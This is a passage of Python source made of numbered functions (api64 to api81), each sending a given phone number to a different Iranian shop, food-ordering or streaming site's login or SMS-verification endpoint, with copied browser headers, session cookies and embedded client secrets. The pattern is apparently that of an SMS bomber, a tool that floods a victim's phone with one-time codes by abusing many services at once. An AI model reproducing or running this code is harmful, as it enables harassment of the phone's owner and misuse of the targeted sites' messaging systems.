        'crisp-client%2Fsession%2F7a20ac30-2fed-4cfd-9aa7-e0ea09f0fa91': 'session_e6ad0b79-c3d3-4826-a6f1-94ab7cc6d515',
    }

    headers = {
        'authority': 'www.safirstores.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://www.safirstores.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.safirstores.com/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'OCSESSID=96c2e24bb5079041a51e97f39d; language=fa-ir; currency=TOM; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=eac0e8c1-cedc-5676-8db8-8955ccc721ef; analytics_session_token=b60f38f6-affc-481f-6347-44376b0fe427; yektanet_session_last_activity=4/1/2022; _yngt_iframe=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _ga=GA1.2.2006950490.1648805433; _gid=GA1.2.211667374.1648805433; _gat_gtag_UA_111640810_1=1; _5ea4432cb01019433b7d5212=true; crisp-client%2Fsession%2F7a20ac30-2fed-4cfd-9aa7-e0ea09f0fa91=session_e6ad0b79-c3d3-4826-a6f1-94ab7cc6d515',
    }

    data = {
        'telephone': number,
    }

    response = requests.post('https://www.safirstores.com/index.php?route=account/login/getRandCode', headers=headers,
                             cookies=cookies, data=data)


def api64(number):
    cookies = {
        'SERVERID': 'm1',
        '_ga_6YW7EZEKMC': 'GS1.1.1649529228.1.0.1649529228.0',
        '_ga': 'GA1.1.506209590.1649529229',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'SERVERID=m1; _ga_6YW7EZEKMC=GS1.1.1649529228.1.0.1649529228.0; _ga=GA1.1.506209590.1649529229',
        'Origin': 'https://m.mobinnet.ir',
        'Referer': 'https://m.mobinnet.ir/Account/Signup',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'CellNumber': number,
    }

    response = requests.post('https://m.mobinnet.ir/api/Account/SendRegisterVerificationCode', headers=headers,
                             cookies=cookies, json=json_data)


def api65(number):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        # Already added when you pass json=
        # 'Content-Type': 'application/json',
        'Origin': 'https://m.postchi.app',
        'Referer': 'https://m.postchi.app/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': number,
        'code': '',
    }

    response = requests.post('https://api.postchi.app/user/sms_login', headers=headers, json=json_data)


def api66(number):
    cookies = {
        'onboarding': 'true',
        '_gcl_au': '1.1.947082054.1649530662',
        '_ga_NX7G5HFPPM': 'GS1.1.1649530661.1.0.1649530661.0',
        '_ga': 'GA1.2.1842871396.1649530663',
        '_gid': 'GA1.2.1242656317.1649530664',
        '_gat_UA-97440721-1': '1',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '31b46098-7838-72d0-339c-c0e423a8d198',
        'analytics_session_token': '3c62551a-3245-e46b-4f0c-b17f824b9db2',
        'yektanet_session_last_activity': '4/9/2022',
        '_yngt_iframe': '1',
        '_hjSessionUser_2451239': 'eyJpZCI6IjFkOWFjMDVmLTgyZjAtNTY1My1hMjk3LTBkZTdiZmIwMTQxNSIsImNyZWF0ZWQiOjE2NDk1MzA2NjQzNzAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInPageviewSample': '1',
        '_hjSession_2451239': 'eyJpZCI6IjFmMjNiOTExLTE5NWUtNDYwMi05MDE5LWExM2Y1OTM5ZTRhYyIsImNyZWF0ZWQiOjE2NDk1MzA2NjQ2MDMsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '0',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
    }

    headers = {
        'authority': 'a4baz.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'text/plain;charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'onboarding=true; _gcl_au=1.1.947082054.1649530662; _ga_NX7G5HFPPM=GS1.1.1649530661.1.0.1649530661.0; _ga=GA1.2.1842871396.1649530663; _gid=GA1.2.1242656317.1649530664; _gat_UA-97440721-1=1; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=31b46098-7838-72d0-339c-c0e423a8d198; analytics_session_token=3c62551a-3245-e46b-4f0c-b17f824b9db2; yektanet_session_last_activity=4/9/2022; _yngt_iframe=1; _hjSessionUser_2451239=eyJpZCI6IjFkOWFjMDVmLTgyZjAtNTY1My1hMjk3LTBkZTdiZmIwMTQxNSIsImNyZWF0ZWQiOjE2NDk1MzA2NjQzNzAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInPageviewSample=1; _hjSession_2451239=eyJpZCI6IjFmMjNiOTExLTE5NWUtNDYwMi05MDE5LWExM2Y1OTM5ZTRhYyIsImNyZWF0ZWQiOjE2NDk1MzA2NjQ2MDMsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'origin': 'https://a4baz.com',
        'referer': 'https://a4baz.com/my/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    data = {"cellphone": number}

    response = requests.post('https://a4baz.com/api/web/login', headers=headers, cookies=cookies, json=data)


def api67(number):
    cookies = {
        'PHPSESSID': '7gl17umfiqibfl6bgllbhmsp22',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        # 'Cookie': 'PHPSESSID=7gl17umfiqibfl6bgllbhmsp22',
        'Referer': 'https://barpin.net/fa/users/auth/login',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'type': 'sms',
        'q': number,
    }

    response = requests.get('https://barpin.net/fa/users/auth/code', headers=headers, params=params, cookies=cookies)


def api68(number):
    cookies = {
        'pub_session': 'o6cg75sjccr7d2upqmc4mgp8t77304o3',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'c1018b09-8235-1399-b76a-feb6b09a0412',
        'analytics_session_token': 'e25ac34b-649a-5159-3eee-3285e309c31a',
        'yektanet_session_last_activity': '4/9/2022',
        '_yngt_iframe': '1',
        '_ga': 'GA1.2.864756709.1649531160',
        '_gid': 'GA1.2.1725845495.1649531160',
        '_gat_gtag_UA_134427044_1': '1',
        'lhc_per': '{%22vid%22:%223588620fab0ad3985ac0%22}',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'pub_session=o6cg75sjccr7d2upqmc4mgp8t77304o3; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=c1018b09-8235-1399-b76a-feb6b09a0412; analytics_session_token=e25ac34b-649a-5159-3eee-3285e309c31a; yektanet_session_last_activity=4/9/2022; _yngt_iframe=1; _ga=GA1.2.864756709.1649531160; _gid=GA1.2.1725845495.1649531160; _gat_gtag_UA_134427044_1=1; lhc_per={%22vid%22:%223588620fab0ad3985ac0%22}; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'Origin': 'https://www.pubisha.com',
        'Referer': 'https://www.pubisha.com/login/index',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': number,
    }

    response = requests.post('https://www.pubisha.com/login/checkCustomerActivation', headers=headers, cookies=cookies,
                             data=data)


def api69(number):
    cookies = {
        '_ga_JR9P860WWB': 'GS1.1.1649531246.1.0.1649531246.0',
        '_ga_07BTFF57BR': 'GS1.1.1649531246.1.0.1649531246.60',
        '_ga_ME9XPK54HZ': 'GS1.1.1649531246.1.0.1649531246.0',
        '_ga': 'GA1.2.1411905978.1649531247',
        '_gid': 'GA1.2.106611023.1649531247',
        '_gat_UA-129758029-2': '1',
        '_gat_gtag_UA_129758029_7': '1',
        '_clck': 'izzuy3|1|f0h|0',
        '_clsk': '11upz9c|1649531248006|1|1|d.clarity.ms/collect',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'Cookie': '_ga_JR9P860WWB=GS1.1.1649531246.1.0.1649531246.0; _ga_07BTFF57BR=GS1.1.1649531246.1.0.1649531246.60; _ga_ME9XPK54HZ=GS1.1.1649531246.1.0.1649531246.0; _ga=GA1.2.1411905978.1649531247; _gid=GA1.2.106611023.1649531247; _gat_UA-129758029-2=1; _gat_gtag_UA_129758029_7=1; _clck=izzuy3|1|f0h|0; _clsk=11upz9c|1649531248006|1|1|d.clarity.ms/collect',
        'Origin': 'https://hiword.ir',
        'Referer': 'https://hiword.ir/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'identifier': number,
    }

    response = requests.post('https://hiword.ir/wp-json/otp-login/v1/login', headers=headers, cookies=cookies,
                             data=data)


def api70(number):
    cookies = {
        'activity': '%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D',
        '_gid': 'GA1.2.1312423213.1649531378',
        '_gat': '1',
        '_gat_UA-119582115-1': '1',
        '_ga_FLDJJP0YRG': 'GS1.1.1649531378.1.0.1649531378.0',
        '_ga': 'GA1.1.1324657823.1649531378',
    }

    headers = {
        'authority': 'chamedoon.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'activity=%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D; _gid=GA1.2.1312423213.1649531378; _gat=1; _gat_UA-119582115-1=1; _ga_FLDJJP0YRG=GS1.1.1649531378.1.0.1649531378.0; _ga=GA1.1.1324657823.1649531378',
        'origin': 'https://chamedoon.com',
        'referer': 'https://chamedoon.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'mobile': number,
        'origin': '/',
        'referrer_id': None,
    }

    response = requests.post('https://chamedoon.com/api/v1/membership/guest/request_mobile_verification',
                             headers=headers, cookies=cookies, json=json_data)


def api71(number):
    cookies = {
        '_gid': 'GA1.2.227528999.1649531474',
        '_gcl_au': '1.1.432726604.1649531474',
        'shab_session': 'eyJpdiI6Ik5tY2pMUUErd0tMTWNKMkhEU2MyOWc9PSIsInZhbHVlIjoiQmkzNndGd1R0dzlQVmJOYW90VXgyVWlTN3dLcTJoZzdqOFNUNW92NGE1bEF6NnpIckcxaENDWjBXeDZyOUJ6SFBWVHh1OWFkbDQzNWNaUDBLMkpmR3pBS0lObTRsbkdwR1R5cFYrMVdvd3YzbXplZjBmMGd1b29tdHA5NkFwbDQiLCJtYWMiOiI1NWEwYzAyOTg4ZjlhOTlkNjJkMzIyYmJiNTc1M2UyMzVlNTIzMDljNmU5Yjg3ZmI0Y2U1N2JmNDVkNGYzMTA4In0%3D',
        '_dc_gtm_UA-105149828-2': '1',
        '_gat_UA-105149828-1': '1',
        '_dc_gtm_UA-105149828-1': '1',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'ee8eecc4-85eb-f663-a26d-3fba8f0b0a6c',
        'analytics_session_token': 'e9b787d1-6efe-d817-a5fe-58283f16bc42',
        'yektanet_session_last_activity': '4/9/2022',
        '_yngt_iframe': '1',
        '_ga': 'GA1.1.1332475257.1649531474',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_ga_5MZJRDTX36': 'GS1.1.1649531474.1.0.1649531476.0',
    }

    headers = {
        'authority': 'www.shab.ir',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'client-id': '1',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_gid=GA1.2.227528999.1649531474; _gcl_au=1.1.432726604.1649531474; shab_session=eyJpdiI6Ik5tY2pMUUErd0tMTWNKMkhEU2MyOWc9PSIsInZhbHVlIjoiQmkzNndGd1R0dzlQVmJOYW90VXgyVWlTN3dLcTJoZzdqOFNUNW92NGE1bEF6NnpIckcxaENDWjBXeDZyOUJ6SFBWVHh1OWFkbDQzNWNaUDBLMkpmR3pBS0lObTRsbkdwR1R5cFYrMVdvd3YzbXplZjBmMGd1b29tdHA5NkFwbDQiLCJtYWMiOiI1NWEwYzAyOTg4ZjlhOTlkNjJkMzIyYmJiNTc1M2UyMzVlNTIzMDljNmU5Yjg3ZmI0Y2U1N2JmNDVkNGYzMTA4In0%3D; _dc_gtm_UA-105149828-2=1; _gat_UA-105149828-1=1; _dc_gtm_UA-105149828-1=1; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=ee8eecc4-85eb-f663-a26d-3fba8f0b0a6c; analytics_session_token=e9b787d1-6efe-d817-a5fe-58283f16bc42; yektanet_session_last_activity=4/9/2022; _yngt_iframe=1; _ga=GA1.1.1332475257.1649531474; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _ga_5MZJRDTX36=GS1.1.1649531474.1.0.1649531476.0',
        'currency': 'IRT',
        'origin': 'https://www.shab.ir',
        'referer': 'https://www.shab.ir/login',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'shab-app': 'web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'mobile': number,
        'country_code': '+98',
    }

    response = requests.post('https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile', headers=headers,
                             cookies=cookies, json=json_data)


def api72(number):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'fa',
        'Browser': 'Chrome',
        'BrowserVersion': '100.0.4896.75',
        'Connection': 'keep-alive',
        # Already added when you pass json=
        # 'Content-Type': 'application/json',
        'IP': '5.127.204.53',
        'OS': 'Windows',
        'Origin': 'https://www.gapfilm.ir',
        'OsVersion': 'NT 10.0',
        'Referer': 'https://www.gapfilm.ir/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'SourceChannel': 'GF_WebSite',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'Type': 3,
        'Username': number,
        'SourceChannel': 'GF_WebSite',
        'SourcePlatform': 'desktop',
        'SourcePlatformAgentType': 'Chrome',
        'SourcePlatformVersion': '100.0.4896.75',
        'GiftCode': None,
    }

    response = requests.post('https://core.gapfilm.ir/api/v3.1/Account/Login', headers=headers, json=json_data)


def api73(number):
    headers = {
        'authority': 'restaurant.delino.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://www.gardinofood.ir',
        'referer': 'https://www.gardinofood.ir/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'apiToken': 'PuScGEp5Jtmwe87dDYLJQ24DAucL5US5MIOGTulN1tZqc93cP15geNlX1OcWleAy',
        'clientSecret': 'YFTl86CilWDWeNhWkyu8CIPB1j2Llod9',
        'device': 'web',
        'username': number,
    }

    response = requests.post('https://restaurant.delino.com/user/register', headers=headers, json=json_data)


def api74(number):
    headers = {
        'authority': 'api.mahabadfood.ir',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://mahabadfood.ir',
        'referer': 'https://mahabadfood.ir/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://api.mahabadfood.ir/api/user/sendCode', headers=headers, json=json_data)


def api75(number):
    headers = {
        'authority': 'restaurant.delino.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://shop.deyfriedchicken.com',
        'referer': 'https://shop.deyfriedchicken.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'apiToken': 'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq',
        'clientSecret': '7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq',
        'device': 'web',
        'username': number,
    }

    response = requests.post('https://restaurant.delino.com/user/register', headers=headers, json=json_data)


def api76(number):
    headers = {
        'authority': 'restaurant.delino.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://www.meykhosh.ir',
        'referer': 'https://www.meykhosh.ir/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'apiToken': 'UpGGiDtMVKKFGbjDoq8Gz1Ba4gtfiIkim9aS5hNNVfftYyVp6Dp30PdeopNCUOoM',
        'clientSecret': 'bqSyGUq2fBJFaChmcUDUUAfThcjQPegO',
        'device': 'web',
        'username': number,
    }

    response = requests.post('https://restaurant.delino.com/user/register', headers=headers, json=json_data)


def api77(number):
    headers = {
        'authority': 'restaurant.delino.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://order.alafood.ir',
        'referer': 'https://order.alafood.ir/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'apiToken': 'O7RisFSJ8vauS76z0dw5FVJ3OOeHMRYNMpixxw5HBNyfRuI9z5EXiuz3xYUelK8p',
        'clientSecret': 'zEQISneiCt5yYfNxnsTVTADAbGme5qtR',
        'device': 'web',
        'username': number,
    }

    response = requests.post('https://restaurant.delino.com/user/register', headers=headers, json=json_data)


def api78(number):
    headers = {
        'authority': 'restaurant.delino.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://www.dar-be-dar.com',
        'referer': 'https://www.dar-be-dar.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'apiToken': 'EpXfxJPewAv4GBVhThgO7tIulNDSX7pfNXJps8NKjZXP0GgebSVuxngVhn5jF7Gz',
        'clientSecret': 'wVURtudOoAqu5DOmuhyCaFJIm7HtOXXI',
        'device': 'web',
        'username': number,
    }

    response = requests.post('https://restaurant.delino.com/user/register', headers=headers, json=json_data)


def api79(number):
    cookies = {
        'PHPSESSID': 'ab5e5f4262cda4206f2b4cc48b4caf03',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'PHPSESSID=ab5e5f4262cda4206f2b4cc48b4caf03',
        'Origin': 'http://order.pitzaaftab.ir',
        'Referer': 'http://order.pitzaaftab.ir/mnu/3916/S43pLk2AzZ',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = {
        'mob': number,
        'psw': '',
        'rno': 'none',
        'sno': 'pass',
        'hid': '',
        'ret': '',
    }

    response = requests.post('http://order.pitzaaftab.ir/login/3916/S43pLk2AzZ', headers=headers, cookies=cookies,
                             data=data)


def api80(number):
    cookies = {
        '_ga': 'GA1.2.1968210357.1649532505',
        '_gid': 'GA1.2.947239087.1649532505',
        '_gat_gtag_UA_126819624_1': '1',
    }

    headers = {
        'authority': 'www.gheyme.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1968210357.1649532505; _gid=GA1.2.947239087.1649532505; _gat_gtag_UA_126819624_1=1',
        'origin': 'https://www.gheyme.com',
        'referer': 'https://www.gheyme.com/profile',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    data = {
        'phone': number,
        'button': '',
    }

    response = requests.post('https://www.gheyme.com/profile/login', headers=headers, cookies=cookies, data=data)


def api81(number):
    cookies = {
        'OCSESSID': '9cb7645d55e2d26b9b4bdb073d',
        'language': 'fa-ir',
        'currency': 'TOM',
        '_ga': 'GA1.1.1515156235.1649532607',
        '_ga_C6X5Y2E16L': 'GS1.1.1649532607.1.1.1649532614.0',
    }

    headers = {
        'authority': 'shop.opco.co.ir',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryuJnTu2FbQ7ZoLcJC',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'OCSESSID=9cb7645d55e2d26b9b4bdb073d; language=fa-ir; currency=TOM; _ga=GA1.1.1515156235.1649532607; _ga_C6X5Y2E16L=GS1.1.1649532607.1.1.1649532614.0',
        'origin': 'https://shop.opco.co.ir',
        'referer': 'https://shop.opco.co.ir/index.php?route=extension/module/login_verify',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

